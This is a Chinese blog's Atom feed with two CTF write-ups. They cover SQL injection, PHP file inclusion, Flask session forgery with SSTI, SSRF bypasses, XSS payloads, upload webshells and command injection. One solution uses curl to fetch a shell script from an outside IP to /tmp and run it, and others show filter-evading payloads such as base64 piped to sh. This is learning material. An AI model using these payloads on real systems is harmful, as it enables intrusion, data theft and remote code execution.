<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://z0ekball.github.io</id>
    <title>z0ekball</title>
    <updated>2022-04-14T19:09:53.054Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://z0ekball.github.io"/>
    <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://z0ekball.github.io/images/avatar.png</logo>
    <icon>https://z0ekball.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, z0ekball</rights>
    <entry>
        <title type="html"><![CDATA[CTF刷题记录(五)]]></title>
        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-wu/</id>
        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-wu/">
        </link>
        <updated>2022-03-05T14:59:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="第一章-web入门sql注入-1">[第一章 web入门]SQL注入-1</h2>
<p>?1’#有回显，说明存在注入点(playload都要进行url编码才能上传成功)</p>
<p>?id=0' order by 3#有回显，4则没有，说明存在3个注入点</p>
<pre><code>? 0' union select 1,2,3#回显2,3，说明回显位置为2,3
</code></pre>
<p>​                  <img src="https://z0ekball.github.io/post-images/image-20220415023630705.png" alt="image-20220415023630705" loading="lazy"></p>
<pre><code>?0' union select 1,database(),3#查数据库，为note
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415023636629.png" alt="image-20220415023636629" loading="lazy"></figure>
<pre><code>?0' union select 1,table_name,3 from information_schema.tables where table_schema='note' limit 0,1#，查表名，为fl4g
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415023643225.png" alt="image-20220415023643225" loading="lazy"></figure>
<pre><code>?0' union select 1,column_name,3 from information_schema.columns where table_name='fl4g' limit 0,1#,查字列，为fllllag
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415023657483.png" alt="image-20220415023657483" loading="lazy"></figure>
<pre><code>? 0' union select 1,fllllag,3 from fl4g limit 0,1#,查字段得flag
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415023703773.png" alt="image-20220415023703773" loading="lazy"></figure>
<h2 id="第一章-web入门sql注入-2">[第一章 web入门]SQL注入-2</h2>
<p>根据提示访问login.php/?，存在盲注，</p>
<p>正确回显“error”:1,“msg”:&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;</p>
<p>错误回显“error”:1,“msg”:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728</p>
<p>爆破脚本，一步一步查数据得到flag</p>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415023832657.png" alt="image-20220415023832657" loading="lazy"></figure>
<p>​     <img src="https://z0ekball.github.io/post-images/image-20220415023919261.png" alt="image-20220415023845927" loading="lazy"></p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415023927773.png" alt="image-20220415023927773" loading="lazy"></figure>
<h2 id="第一章-web入门afr_1">[第一章 web入门]afr_1</h2>
<p>利用<code>伪协议</code>读取flag的base64编码</p>
<pre><code>Playload: ?p=php://filter/read=convert.base64-encode/resource=flag
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415023953961.png" alt="image-20220415023953961" loading="lazy"></figure>
<p>解码得flag</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415024001374.png" alt="image-20220415024001374" loading="lazy"></figure>
<h2 id="第一章-web入门afr_2">[第一章 web入门]afr_2</h2>
<p>源码给出提示，图片在img目录下</p>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415024029749.png" alt="image-20220415024029749" loading="lazy"></figure>
<p>访问该目录，存在<code>目录穿越</code></p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415024036564.png" alt="image-20220415024036564" loading="lazy"></figure>
<p>访问img../，下载flag</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415024051034.png" alt="image-20220415024051034" loading="lazy"></figure>
<h2 id="第一章-web入门afr_3">[第一章 web入门]afr_3</h2>
<p>根据题目提示找到读取文件途径</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415024113151.png" alt="image-20220415024113151" loading="lazy"></figure>
<p>../../../etc/passwd<code>查看系统用户配置文件</code>，没有什么有用信息</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415024121104.png" alt="image-20220415024121104" loading="lazy"></figure>
<p>../../../proc/self/cmdline<code>查看当前进程cmdline参数</code></p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415024146591.png" alt="image-20220415024146591" loading="lazy"></figure>
<p>../../../proc/self/cwd/server.py<code>查看该程序代码</code>，存在flag.py和key.py</p>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415024152967.png" alt="image-20220415024152967" loading="lazy"></figure>
<p>../../../proc/self/cwd/flag.py，不允许访问</p>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415024202683.png" alt="image-20220415024202683" loading="lazy"></figure>
<p>../../../proc/self/cwd/key.py得到信息</p>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415024207877.png" alt="image-20220415024207877" loading="lazy"></figure>
<p>查看代码，意思是flag在flag.py，key.py就是flask的app.secret_key，存在<code>ssti漏洞</code>，伪造flask的session即可访问flag.py</p>
<p><code>Session</code>: session和cookie的作用有点类似，都是为了存储用户相关的信息。不同的是，cookie是存储在本地浏览器，而session存储在服务器。</p>
<p>使用flask-session-cookie-manager-master工具伪造session</p>
<h3 id="一些python魔法方式"><code>一些python魔法方式</code>：</h3>
<pre><code>__class__  返回类型所属的对象（类）

__mro__  返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。

__base__  返回该对象所继承的基类

// __base__和__mro__都是用来寻找基类的

__subclasses__  每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表

__init__ 类的初始化方法

__globals__  对包含函数全局变量的字典的引用
</code></pre>
<p>构造语句：</p>
<pre><code>{'n1code’:’{{\’\’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\’os\’].popen(\’cat flag.py\’).read()}}’}  //使用工具时，由于用到python环境，要把转义单引号
</code></pre>
<p>使用工具-s 传入key -t传入构造语句，加密得到伪造的session</p>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415024408506.png" alt="image-20220415024408506" loading="lazy"></figure>
<p>上传伪造的session,得到flag</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415024417095.png" alt="image-20220415024417095" loading="lazy"></figure>
<h2 id="第二章-web进阶ssrf-training">[第二章 web进阶]SSRF Training</h2>
<p>根据题目提示找到源码，分析如下</p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415024535639.png" alt="image-20220415024438584" loading="lazy"></figure>
<p>对于关键函数的测试</p>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415024543679.png" alt="image-20220415024543679" loading="lazy"></figure>
<p>结果如图</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415024554976.png" alt="image-20220415024554976" loading="lazy"></figure>
<p>通过构造url，能够绕过私有地址检测，从而执行else中的操作，读取flag.php</p>
<p>构造：</p>
<pre><code>url=https://a:@127.0.0.1:80@hao123.com/flag.php
</code></pre>
<p>测试</p>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415024730073.png" alt="image-20220415024730073" loading="lazy"></figure>
<p>上传得flag</p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415024736248.png" alt="image-20220415024736248" loading="lazy"></figure>
<h2 id="第二章-web进阶死亡ping命令">[第二章 web进阶]死亡ping命令</h2>
<p>创建字典：</p>
<pre><code>&quot;~&quot;,&quot;!&quot;,&quot;@&quot;,&quot;#&quot;,&quot;$&quot;,&quot;%&quot;,&quot;^&quot;,&quot;&amp;&quot;,&quot;*&quot;,&quot;(&quot;,&quot;)&quot;,&quot;-&quot;,&quot;_&quot;,&quot;\\&quot;,&quot;[&quot;,&quot;]&quot;,&quot; ' &quot;,&quot;%0a&quot;,&quot;%0b&quot;,&quot;%0c&quot;,&quot;%0d&quot;
</code></pre>
<p>在burpsuite进行<code>fuzz测试</code>，找到回显长度不同的符号</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415024812202.png" alt="image-20220415024812202" loading="lazy"></figure>
<p>逐个测试，找到不被过滤的符号**%0a(换行符)**</p>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415024824780.png" alt="image-20220415024824780" loading="lazy"></figure>
<p>打开一个靶机</p>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415024831887.png" alt="image-20220415024831887" loading="lazy"></figure>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415024850749.png" alt="image-20220415024850749" loading="lazy"></figure>
<p>编写一个sh</p>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415024903714.png" alt="image-20220415024903714" loading="lazy"></figure>
<p>监听端口</p>
<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415024908035.png" alt="image-20220415024908035" loading="lazy"></figure>
<p>请求bash到tmp目录</p>
<pre><code>ip=127.0.0.1%0acurl 117.21.200.166/1.sh &gt; /tmp/1.sh
</code></pre>
<p><img src="https://z0ekball.github.io/post-images/image-20220415024930358.png" alt="image-20220415024930358" loading="lazy">给bash加权限</p>
<p>给bash加权限</p>
<pre><code>ip=127.0.0.1%0achmod 777 /tmp/1.sh
</code></pre>
<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415025013117.png" alt="image-20220415025013117" loading="lazy"></figure>
<p>执行1.sh</p>
<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415025021543.png" alt="image-20220415025021543" loading="lazy"></figure>
<p>监听到flag n1book{6fa82809179d7f19c67259aa285a7729}</p>
<h2 id="第二章-web进阶xss闯关">[第二章 web进阶]XSS闯关</h2>
<ol>
<li></li>
</ol>
<pre><code> level1?username=&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415025107326.png" alt="image-20220415025107326" loading="lazy"></figure>
<p>2.查看源码，参数username被escape函数编码，从而过滤了通过username参数的注入  <img src="https://z0ekball.github.io/post-images/image-20220415025125677.png" alt="image-20220415025125677" loading="lazy"></p>
<p>解决办法是不用username参数注入，</p>
<p>’进行闭合，直接过滤，</p>
<p>；执行下一个语句，</p>
<p>//注释掉多余的’</p>
<pre><code>level2?username=';alert(1);//
</code></pre>
<p>得到<img src="https://z0ekball.github.io/post-images/image-20220415025158628.png" alt="image-20220415025158628" loading="lazy"></p>
<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/mage-20220415025220165.png" alt="image-20220415025220165" loading="lazy"></figure>
<p>3.查看源码</p>
<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415025233594.png" alt="image-20220415025233594" loading="lazy"></figure>
<p>输入level2注入语句，可知’被注释掉了</p>
<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415025240693.png" alt="image-20220415025240693" loading="lazy"></figure>
<p>再加一个’就能绕过，'';alert(1);//</p>
<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415025246726.png" alt="image-20220415025246726" loading="lazy"></figure>
<pre><code>level3?username='';alert(1);//
</code></pre>
<figure data-type="image" tabindex="38"><img src="https://z0ekball.github.io/post-images/image-20220415025310509.png" alt="image-20220415025310509" loading="lazy"></figure>
<p>4.有一个重定向的伪链接 <img src="https://z0ekball.github.io/post-images/image-20220415025358866.png" alt="image-20220415025358866" loading="lazy"></p>
<p>查看源码，get方式获取重定向链接，修改链接值即可</p>
<figure data-type="image" tabindex="39"><img src="https://z0ekball.github.io/post-images/image-20220415025405015.png" alt="image-20220415025405015" loading="lazy"></figure>
<pre><code>level4?jumpUrl=javascript:alert(1)
</code></pre>
<figure data-type="image" tabindex="40"><img src="https://z0ekball.github.io/post-images/image-20220415025424391.png" alt="image-20220415025424391" loading="lazy"></figure>
<p>5.查看源码，get方式传入参数，有两个限制</p>
<p>Autosubmit!=0且action！=0</p>
<figure data-type="image" tabindex="41"><img src="https://z0ekball.github.io/post-images/image-20220415025434809.png" alt="image-20220415025434809" loading="lazy"></figure>
<p>构造参数：</p>
<pre><code>?autosubmit=1&amp;action=javascript:alert(1)绕过第一个参数，执行第二个参数动作
</code></pre>
<figure data-type="image" tabindex="42"><img src="https://z0ekball.github.io/post-images/image-20220415025455475.png" alt="image-20220415025455475" loading="lazy"></figure>
<p>6.输入{{2*2}}回显，说明存在模板注入</p>
<figure data-type="image" tabindex="43"><img src="https://z0ekball.github.io/post-images/image-20220415025503046.png" alt="image-20220415025503046" loading="lazy"></figure>
<p>看源码，发现是AngularJS1.4.6版本</p>
<figure data-type="image" tabindex="44"><img src="https://z0ekball.github.io/post-images/image-20220415025508843.png" alt="image-20220415025508843" loading="lazy"></figure>
<pre><code>查阅对应版本模板注入，{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}直接套用
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://z0ekball.github.io/post-images/image-20220415025533764.png" alt="image-20220415025533764" loading="lazy"></figure>
<p>得到flag<img src="https://z0ekball.github.io/post-images/image-20220415025538072.png" alt="image-20220415025538072" loading="lazy"></p>
<h2 id="第二章-web进阶文件上传">[第二章 web进阶]文件上传</h2>
<p>题目直接给出了源码，得到过滤信息：</p>
<p>1.仅允许上传zip、jpg、gif、png文件</p>
<p>2.如果上传压缩包，压缩包内不允许含有php文件</p>
<figure data-type="image" tabindex="46"><img src="https://z0ekball.github.io/post-images/image-20220415025600830.png" alt="image-20220415025600830" loading="lazy"></figure>
<p>上传一个含有php的zip</p>
<figure data-type="image" tabindex="47"><img src="https://z0ekball.github.io/post-images/image-20220415025606851.png" alt="image-20220415025606851" loading="lazy"></figure>
<p>要绕过php，改成phtml，上传成功，问题是不知道路径</p>
<figure data-type="image" tabindex="48"><img src="https://z0ekball.github.io/post-images/image-20220415025618302.png" alt="image-20220415025618302" loading="lazy"></figure>
<p>上传成功后会在upload下随机生成一个md5目录存放文件，也就是说很难拿到文件的路径，设法绕过这个目录，让文件存储在根目录下</p>
<p><code>010 editor</code>修改文件名，使之存在根目录下（修改的时候现在原来的文件名预留足够的位置）</p>
<figure data-type="image" tabindex="49"><img src="https://z0ekball.github.io/post-images/image-20220415025635449.png" alt="image-20220415025635449" loading="lazy"></figure>
<p>文件名换成php.xx(<code>Apache解析漏洞</code>)</p>
<h3 id="apache解析漏洞"><code>Apache解析漏洞</code>：</h3>
<p>一个文件名为test.php.aaa.bbb.ccc的文件，Apache会从ccc的位置往php的位置开始尝试解析 ，如果ccc不属于Apache能解析的后缀名，那么Apache就会尝试去解析bbb，这样一直往前尝试，直到遇到一个能解析的拓展名为止</p>
<p>上传后访问，得到flag</p>
<figure data-type="image" tabindex="50"><img src="https://z0ekball.github.io/post-images/image-20220415025711242.png" alt="image-20220415025711242" loading="lazy"></figure>
<h2 id="第三章-web进阶python里的ssrf">[第三章 web进阶]Python里的SSRF</h2>
<p>题目给出了提示</p>
<figure data-type="image" tabindex="51"><img src="https://z0ekball.github.io/post-images/image-20220415025737136.png" alt="image-20220415025737136" loading="lazy"></figure>
<p>构造</p>
<pre><code>url=http://127.0.0.1:8000/api/internal/secret
127.0.0.1被禁止
</code></pre>
<figure data-type="image" tabindex="52"><img src="https://z0ekball.github.io/post-images/image-20220415025743538.png" alt="image-20220415025743538" loading="lazy"></figure>
<p>换成127.0.0.2，得到flag</p>
<figure data-type="image" tabindex="53"><img src="https://z0ekball.github.io/post-images/image-20220415025825788.png" alt="image-20220415025825788" loading="lazy"></figure>
<h3 id="绕过ip限制"><code>绕过ip限制</code>：</h3>
<pre><code>1、@绕过：

127.0.0.1和[www.baidu.com@127.0.0.1](http://www.baidu.com@127.0.0.1)解析结果一样

2、localhost或者0.0.0.0代替

3、在线转换短网址代替
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF刷题记录(一)]]></title>
        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-yi/</id>
        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-yi/">
        </link>
        <updated>2021-12-02T18:20:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="hctf-2018warmup">[HCTF 2018]WarmUp</h2>
<p>文件包含，代码审计。</p>
<p>根据提示查看source.php看到源码，进行代码审计。</p>
<pre><code class="language-php">&lt;?php

  highlight_file(__FILE__);  //高光显示

  class emmm    //定义一个类

  {

​    public static function checkFile(&amp;$page)   //定义一个函数

​    {

​      $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];  //定义白名单

​      if (! isset($page) || !is_string($page)) {     //isset（）判断变量是否声明，is_string判断变量是否为字符串

​         echo &quot;you can't see it&quot;;

​        return false;

​      }

​      if (in_array($page, $whitelist)) {    //in_array判断page是否在白名单数组中

​        return true;

​      }

​      $_page = mb_substr(       //mb_substr(str,start,length)从start开始截取str字符串length长

​        $page,

​        0,

​        mb_strpos($page . '?', '?')   //mb_strpos返回要查找字符串的首次出现位置,page.’?’拼接一个‘？’

​      );

​      if (in_array($_page, $whitelist)) {

​        return true;

​      }

​      $_page = urldecode($page); //url解码

​      $_page = mb_substr(

​        $_page,

​        0,

​        mb_strpos($_page . '?', '?')

​      );

​      if (in_array($_page, $whitelist)) {

​        return true;

​      }

​      echo &quot;you can't see it&quot;;

​      return false;

​    }

  }

  if (! empty($_REQUEST['file']) //请求file且file满足下列条件

​    &amp;&amp; is_string($_REQUEST['file'])

​    &amp;&amp; emmm::checkFile($_REQUEST['file'])

  ) {

​    include $_REQUEST['file'];  

​    exit;

  } else {

​    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;

  } 

?&gt;
</code></pre>
<p><code>总体理解</code>：请求file，cehckfile对其进行了三次白名单检测，2次问号截断，1次url解码，需要构造语句绕过这些检测。</p>
<p>Hint.php给出提示，flag就在ffffllllaaaagggg文件里，结合文件包含访问这个文件</p>
<p>​                <img src="https://z0ekball.github.io/post-images/image-20220415020227298.png" alt="image-20220415020227298" loading="lazy"></p>
<p><code>构造语句</code>：</p>
<pre><code>file=source.php?../../../../../ffffllllaaaagggg
</code></pre>
<p>直接绕过第一次白名单检测，？截断语句成source.php绕过前第二次白名单检测，剩下source.php在拼接上‘？’和上一步一样第三次白名单检测，返回true之后执行文件包含漏洞执行后续语句，得到flag</p>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415020240200.png" alt="image-20220415020240200" loading="lazy"></figure>
<h2 id="极客大挑战-2019easysql">[极客大挑战 2019]EasySQL</h2>
<p>简单get型sql注入</p>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415020340624.png" alt="image-20220415020326438" loading="lazy"></figure>
<h2 id="极客大挑战-2019havefun">[极客大挑战 2019]Havefun</h2>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415020407768.png" alt="image-20220415020407768" loading="lazy"></figure>
<p>Get方式提交请求/?cat=dog</p>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415020424699.png" alt="image-20220415020424699" loading="lazy"></figure>
<h2 id="强网杯-2019随便注">[强网杯 2019]随便注</h2>
<p>1’/<strong>/or/</strong>/1&gt;0#有回显，存在注入点</p>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415020507896.png" alt="image-20220415020507896" loading="lazy"></figure>
<p>1'union(select/<strong>/database(),2/</strong>/)#回显</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415020516607.png" alt="image-20220415020516607" loading="lazy"></figure>
<p>说明存在过滤，试试大小写绕过，不行。Sqlmap也无法注入，搜查资料发现是堆叠注入。</p>
<h3 id="堆叠注入"><code>堆叠注入</code>：</h3>
<p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，堆叠注入可以用于执行任何SQL语句。在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p>
<p>查库注入语句：</p>
<pre><code>0';show database();#
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415020601094.png" alt="image-20220415020601094" loading="lazy"></figure>
<p>查表注入语句：0';show tables;#回显</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415020618420.png" alt="image-20220415020618420" loading="lazy"></figure>
<pre><code>0';desc `1919810931114514`;#
</code></pre>
<p>查询第一个表</p>
<pre><code>0';desc `1919810931114514`;#（desc 表示降序显示该表，注：需用反引号括起表名）
</code></pre>
<p>flag就在其中</p>
<p>查询第二个表</p>
<pre><code>0';desc words;#
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415020724217.png" alt="image-20220415020724217" loading="lazy"></figure>
<p>不难看出，查询的后端语句可能为select id,data from words where id=，</p>
<p>但flag在另一个表中无法直接读出，这时候可以通过修改表名，使得查询语句查询的是flag表从而回显变成flag。</p>
<p><code>更换表名语句</code>：rename table A to B</p>
<p><code>更换属性名语句</code>：alter table A change x to b</p>
<p>注入语句：</p>
<pre><code>0';rename table `words` to w;rename table `1919810931114514` to words;alter table `words` change flag id varchar(100);# (表名要用反引号括起)
</code></pre>
<p>再次查表，换名成功</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415020820891.png" alt="image-20220415020820891" loading="lazy"></figure>
<p>再次输入1’or 1&gt;0#，得到flag</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415020828269.png" alt="image-20220415020828269" loading="lazy"></figure>
<h2 id="极客大挑战-2019knife">[极客大挑战] 2019]Knife</h2>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415020846527.png" alt="image-20220415020846527" loading="lazy"></figure>
<p>很直白，蚁剑连接拿到flag</p>
<h3 id="6gxyctf2019babyupload">6.[GXYCTF2019]BabyUpload</h3>
<p>不能含有ph，尝试用<code>Apache漏洞</code>php.xxx绕过，不成功。</p>
<p>上传<code>.htaccess文件</code>，.htaccess文件内容为把同名文件2.jpeg解析为php文件</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415020917405.png" alt="image-20220415020917405" loading="lazy"></figure>
<p><code>MIME绕过</code>，content-type改为image/jpeg绕过文件类型检查</p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415020924311.png" alt="image-20220415020924311" loading="lazy"></figure>
<p>再上传一个含有一句话木马的同名文件2.jpeg</p>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415020955280.png" alt="image-20220415020955280" loading="lazy"></figure>
<p>上传成功，访问jpeg文件成功，说明已被解析为php，蚁剑连接找到flag</p>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415021012924.png" alt="image-20220415021005376" loading="lazy"></figure>
<h2 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h2>
<p>网页源码得到信息并访问</p>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415021030051.png" alt="image-20220415021030051" loading="lazy"></figure>
<p>得到以下页面，点击按钮显示查阅完毕</p>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415021035545.png" alt="image-20220415021035545" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415021054851.png" alt="image-20220415021054851" loading="lazy"></figure>
<p>查看网页源码，显示跳转的是action页面，但最终给出的页面是end.php</p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415021114833.png" alt="image-20220415021114833" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415021122956.png" alt="image-20220415021122956" loading="lazy"></figure>
<p>使用burpsuit截拦action，得到信息secr3t.php</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415021135755.png" alt="image-20220415021135755" loading="lazy"></figure>
<p>访问该页面得到以下源代码</p>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415021140901.png" alt="image-20220415021140901" loading="lazy"></figure>
<p>意思是get传入一个文件名，文件名不能包含../、tp、input、data，包括其大小写，如果能够绕过这些过滤的话，传入的文件名就会被文件包含，同时提示了flag就在flag.php里。</p>
<p>考虑使用伪协议进行绕过，过滤了php://input，但没过滤php://filter</p>
<h3 id="伪协议"><code>伪协议</code>：</h3>
<p><code>php://</code> 访问各个输入/输出流（I/O streams）；</p>
<p><code>php://filter</code>用于读取源码，读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了；</p>
<p><code>php://input</code>用于执行php代码，可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
<p>结合文件包含漏洞构造</p>
<pre><code>playload:?file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p>返回的是base64编码</p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415021255672.png" alt="image-20220415021255672" loading="lazy"></figure>
<p>解码得出flag</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415021306057.png" alt="image-20220415021306057" loading="lazy"></figure>
<h2 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h2>
<p>输入ip=1，回显</p>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415021318613.png" alt="image-20220415021318613" loading="lazy"></figure>
<p>利用Linux 命令执行的管道符漏洞</p>
<h3 id="管道符"><code>管道符</code>：</h3>
<p><code>Windows</code>:</p>
<pre><code>Ping 2|whoami：直接执行后面语句；

Ping 2||whoami：前面语句为假时执行后面语句，前者只能是假

Ping 2&amp;whoami：前面语句为假时执行后面语句，前者可假可真

Ping 2&amp;&amp;whoami：前面语句为假则不执行后者
</code></pre>
<p><code>Linux</code>:</p>
<pre><code>Ping 2;whoami：执行完前者执行后者

Ping 2|whoami：直接执行后者

Ping 2||whoami：前面语句为假时执行后面语句，前者只能是假

Ping 2&amp;whoami：前面语句为假时执行后面语句，前者可假可真

Ping 2&amp;&amp;whoami：前面语句为假则不执行后者

构造playload:?ip=1;ls //返回当前目录
</code></pre>
<p>尝试访问flag.php</p>
<pre><code>playload:?ip=1;cat flag.php
</code></pre>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415021417955.png" alt="image-20220415021417955" loading="lazy"></figure>
<p>过滤空格，<code>$IFS$1</code>绕过空格</p>
<pre><code>playload:?ip=1;cat$IFS$1flag.php
</code></pre>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415021531101.png" alt="image-20220415021531101" loading="lazy"></figure>
<p>过滤了flag,再用变量绕过敏感字符</p>
<pre><code>playload:?ip=1;b=g;cat$IFS$1fla$b.php
</code></pre>
<p>在网页源码找到了flag</p>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415021622936.png" alt="image-20220415021622936" loading="lazy"></figure>
<p><code>多解</code>：</p>
<p>先对 cat flag.php 进行<code>base64 加密</code>，过滤 bash ，那就用 sh</p>
<pre><code>Playload：?ip=1; echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
</code></pre>
<p>内联执行，使用 `` 代替 | ，将反引号内命令执行两次</p>
<h2 id="第一章-web入门常见的搜集">[第一章 web入门]常见的搜集</h2>
<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415021727374.png" alt="image-20220415021727374" loading="lazy"></figure>
<p>源码看不到什么信息，根据提示查找<code>敏感文件</code>：</p>
<pre><code>1.gedit备份文件，格式为filename,如index.php 
 2.vim备份文件，格式为.filename.swp或者*.swo或者*.swn，比 如.index.php.swp
 3.robots.txt
</code></pre>
<p>查robots.txt</p>
<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415021748561.png" alt="image-20220415021748561" loading="lazy"></figure>
<p>根据提示访问</p>
<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415021755420.png" alt="image-20220415021755420" loading="lazy"></figure>
<p>访问index.php~</p>
<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415021836827.png" alt="image-20220415021836827" loading="lazy"></figure>
<p>访问index.php.swp,下载文件</p>
<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/image-20220415021844720.png" alt="image-20220415021844720" loading="lazy"></figure>
